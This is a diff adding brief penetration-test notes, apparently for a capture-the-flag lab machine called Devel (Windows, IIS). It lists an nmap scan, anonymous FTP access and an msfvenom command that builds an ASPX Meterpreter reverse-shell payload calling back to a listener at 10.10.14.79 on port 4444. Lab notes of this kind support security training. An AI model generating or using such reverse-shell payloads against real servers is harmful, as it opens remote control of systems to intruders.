@@ -1,0 +1,14 @@
+Devel (Windows) - 10.129.87.19 (IIS)
+
+	sudo nmap -sVC 10.129.87.19 -Pn
+	
+		21 ftp
+		80 http
+		
+	21 ftp -a 10.129.87.19 
+	
+	whatweb
+	grep -rn "common.txt" /usr/share
+	
+	
+	msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.79 LPORT=4444 -f aspx > shell.aspx
